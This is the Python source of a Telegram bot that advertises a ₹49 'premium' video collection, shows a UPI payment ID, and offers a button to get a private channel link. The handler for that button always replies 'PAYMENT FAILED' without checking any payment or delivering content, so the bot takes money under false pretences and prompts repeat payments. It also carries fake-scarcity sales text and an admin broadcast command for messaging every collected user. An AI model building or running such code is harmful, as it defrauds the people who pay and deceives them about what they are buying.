import os
import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton

# 🔒 ENV VARIABLES
TOKEN = os.getenv("BOT_TOKEN")
ADMIN_ID = int(os.getenv("ADMIN_ID"))

bot = telebot.TeleBot(TOKEN)

banned_users = set()
users = set()

# 🔥 START COMMAND
@bot.message_handler(commands=['start'])
def start(message):
    if message.from_user.id in banned_users:
        return

    user_id = message.from_user.id
    users.add(user_id)

    text = """🔥 𝐏𝐑𝐄𝐌𝐈𝐔𝐌 𝐂𝐎𝐋𝐋𝐄𝐂𝐓𝐈𝐎𝐍 𝐔𝐍𝐋𝐎𝐂𝐊𝐄𝐃 🔥

𝐇𝐃 + 𝐔𝐥𝐭𝐫𝐚-𝐅𝐫𝐞𝐬𝐡 𝐕𝐢𝐝𝐞𝐨𝐬 𝐀𝐯𝐚𝐢𝐥𝐚𝐛𝐥𝐞 𝐍𝐨𝐰

𝐀𝐥𝐥 𝐂𝐚𝐭𝐞𝐠𝐨𝐫𝐢𝐞𝐬 𝐢𝐧 𝐎𝐧𝐞 𝐏𝐚𝐜𝐤𝐚𝐠𝐞

💎 𝐎𝐧𝐥𝐲 𝐑𝐬 49₹ 𝐟𝐨𝐫 𝐋𝐢𝐦𝐢𝐭𝐞𝐝 𝐓𝐢𝐦𝐞 💎

✅ 𝐅𝐮𝐥𝐥 𝐇𝐃 𝐐𝐮𝐚𝐥𝐢𝐭𝐲
✅ 𝐈𝐧𝐬𝐭𝐚𝐧𝐭 𝐃𝐞𝐥𝐢𝐯𝐞𝐫𝐲
✅ 𝟏𝟎𝟎% 𝐖𝐨𝐫𝐤𝐢𝐧𝐠 & 𝐔𝐩𝐝𝐚𝐭𝐞𝐝 𝐋𝐢𝐧𝐤𝐬

𝐋𝐚𝐬𝐭 𝐟𝐞𝐰 𝐬𝐥𝐨𝐭𝐬 𝐚𝐭 49₹ → 𝐃𝐨𝐧'𝐭 𝐦𝐢𝐬𝐬 𝐢𝐭!
"""

    markup = InlineKeyboardMarkup()
    markup.add(
        InlineKeyboardButton("BUY PREMIUM ❤️", callback_data="buy"),
        InlineKeyboardButton("FREE DEMO 🎉", url="https://t.me/Pomp0mm_bot?start=BQADAQADdxQAAs65sEY6z3rGKGQgPBYE")
    )
    markup.add(
        InlineKeyboardButton("HOW TO BUY PREMIUM 🧿", url="https://t.me/HOW_TO_BUY_PREMIUM")
    )

    bot.send_photo(
        chat_id=user_id,
        photo="https://kommodo.ai/i/nc5zJIJa4gO94AzXLemD",
        caption=text,
        reply_markup=markup
    )

# 💰 BUY BUTTON
@bot.callback_query_handler(func=lambda call: call.data == "buy")
def buy(call):

    text = """💎 𝐏𝐑𝐄𝐌𝐈𝐔𝐌 𝐌𝐄𝐌𝐁𝐄𝐑𝐒𝐇𝐈𝐏 💎

📦 𝐏𝐥𝐚𝐧 : 𝐋𝐢𝐟𝐞𝐭𝐢𝐦𝐞 𝐀𝐜𝐜𝐞𝐬𝐬
💰 𝐏𝐫𝐢𝐜𝐞 : ₹49

━━━━━━━━━━━━━━━

🏦 𝐔𝐏𝐈 𝐈𝐃 : `q78849684@ybl`

📲 𝐒𝐜𝐚𝐧 𝐭𝐡𝐞 𝐐𝐑 𝐚𝐧𝐝 𝐜𝐨𝐦𝐩𝐥𝐞𝐭𝐞 𝐩𝐚𝐲𝐦𝐞𝐧𝐭

━━━━━━━━━━━━━━━

💡 𝐀𝐟𝐭𝐞𝐫 𝐬𝐮𝐜𝐜𝐞𝐬𝐬𝐟𝐮𝐥 𝐩𝐚𝐲𝐦𝐞𝐧𝐭  
𝐂𝐥𝐢𝐜𝐤 𝐭𝐡𝐞 𝐛𝐮𝐭𝐭𝐨𝐧 𝐛𝐞𝐥𝐨𝐰

🔥 Limited slots — don't miss out!
"""

    markup = InlineKeyboardMarkup()
    markup.add(
        InlineKeyboardButton("𝐆𝐄𝐓 𝐏𝐑𝐈𝐕𝐀𝐓𝐄 𝐂𝐇𝐀𝐍𝐍𝐄𝐋 𝐋𝐈𝐍𝐊 ✅", callback_data="paid")
    )

    bot.send_photo(
        chat_id=call.from_user.id,
        photo="https://kommodo.ai/i/7q1diYvCngkoenmyTkzL",
        caption=text,
        parse_mode="Markdown",
        reply_markup=markup
    )

    bot.answer_callback_query(call.id)

# ❌ PAYMENT FAILED (CHAT MESSAGE)
@bot.callback_query_handler(func=lambda call: call.data == "paid")
def paid(call):
    bot.answer_callback_query(call.id, "❌ PAYMENT FAILED")

    bot.send_message(
        call.from_user.id,
        "❌ PAYMENT FAILED\n\nPayment karo, fir try karo. (Make the payment, then try again)"
    )

# 🚫 BAN USER
@bot.message_handler(commands=['ban'])
def ban_user(message):
    if message.from_user.id != ADMIN_ID:
        return

    try:
        user_id = int(message.text.split()[1])
        banned_users.add(user_id)
        bot.reply_to(message, "User banned 🚫")
    except:
        bot.reply_to(message, "Usage: /ban user_id")

# ✅ UNBAN USER
@bot.message_handler(commands=['unban'])
def unban_user(message):
    if message.from_user.id != ADMIN_ID:
        return

    try:
        user_id = int(message.text.split()[1])
        banned_users.discard(user_id)
        bot.reply_to(message, "User unbanned ✅")
    except:
        bot.reply_to(message, "Usage: /unban user_id")

# 📢 BROADCAST
@bot.message_handler(commands=['broadcast'])
def broadcast(message):
    if message.from_user.id != ADMIN_ID:
        return

    text = message.text.replace('/broadcast ', '')

    for user in users:
        try:
            bot.send_message(user, text)
        except:
            pass

    bot.reply_to(message, "Broadcast sent ✅")

print("Bot Running...")
bot.infinity_polling()
